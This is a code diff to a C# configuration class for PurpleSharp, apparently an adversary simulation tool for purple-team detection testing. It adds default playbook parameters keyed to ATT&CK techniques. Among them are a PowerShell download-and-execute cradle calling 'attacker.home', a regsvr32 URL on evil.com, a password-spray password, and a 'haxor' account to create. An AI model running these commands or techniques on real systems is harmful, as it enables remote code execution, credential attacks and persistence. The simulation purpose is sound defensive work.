@@ -95,6 +95,8 @@ namespace PurpleSharp.Lib
         public string remote_host { get; set; }
         public string opsec { get; set; } = "ppid";
         public bool enabled { get; set; } = true;
+        
+        public int techs { get; set; } = 0;
         public List<PlaybookTask> tasks { get; set; }
         public SimulationPlaybook(int pbsleep)
         {
@@ -115,12 +117,12 @@ namespace PurpleSharp.Lib
         public int task_sleep { get; set; } = 0;
         public bool cleanup { get; set; } = true;
 
-        // Password Spraying T1110.003
+        // Used by Password Spraying T1110.003
         public string protocol { get; set; } = "Kerberos";
         public string spray_password { get; set; } = "Passw0rd1";
 
         // User target variables
-        // User by Password Spraying & Kerberoasting
+        // Used by Password Spraying T1110.003 & Kerberoasting
         public int user_target_type { get; set; } = 1;
         public int user_target_total { get; set; } = 5;
         public string[] user_targets { get; set; }
@@ -130,22 +132,55 @@ namespace PurpleSharp.Lib
         public int host_target_total { get; set; } = 5;
         public string[] host_targets { get; set; }
         
-        // Group Domain Enumeration T1069.002
-        public string[] groups { get; set; } = { };
+        // Used by Group Domain Enumeration T1069.002
+        public string[] groups { get; set; } = {"Domain Admins", "Enterprise Admins"};
 
-        // Network Service Scanning
+        // Used by Group Domain Enumeration T1069.002
+        public string[] users { get; set; } = {};
+
+        // Used by T1046 Network Service Scanning
         public int[] ports { get; set; } = { 135, 139, 443, 445, 1433, 3306, 3389 };
 
-        // Remote Service Creation
+        // Used by Remote Service Creation T1569.002, T1543.003
         public string serviceName { get; set; } ="PurpleSharp Updater";
         public string servicePath { get; set; } = @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
+        public string serviceDisplayname { get; set; } = @"PurpleSharp Updater";
 
-        // WinRM remote execution and WMI remote execution
-        public string command { get; set; } = @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
+        // Used by T1021.006 WinRM remote execution and T1047 WMI remote execution
+        public string payload { get; set; } = @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
 
-        // Creating local and remote scheduled tasks
+        // Used by T1053.005
         public string taskName { get; set; } = @"PurpleSharp Updater";
         public string taskPath { get; set; } = @"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
+
+        // Used by rundll32.exe, regsvr32.exe and others
+        public string dllPath { get; set; } = @"C:\Windows\twain_64.dll";
+        public string exportName { get; set; } = @"System";
+
+        // Used by regsvr32.exe and others
+        public string url { get; set; } = @"http://evil.com/image.png";
+
+        // Used by PowerShell T1059.001
+        public string commandlet { get; set; } = @"iex(New-Object Net.WebClient).DownloadString('http://attacker.home/myscript.ps1')";
+
+        // Used by account creation T1136.001 & T1136.002
+        public string user { get; set; } = @"haxor";
+        public string password { get; set; } = @"Passw0rd123El7";
+
+        // Used by T1059.003
+        public string command { get; set; } = @"whoami /groups";
+
+        // Used by T1082.002
+        public string ldapQuery { get; set; } = @"(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
+
+        // Used by T1055.002
+        public string process_name { get; set; } = @"";
+
+        // Used by T1570, T1059.005, T1059.007
+        public string file_path { get; set; } = @"";
+
+        public string remote_path { get; set; } = @"";
+
 
 
 
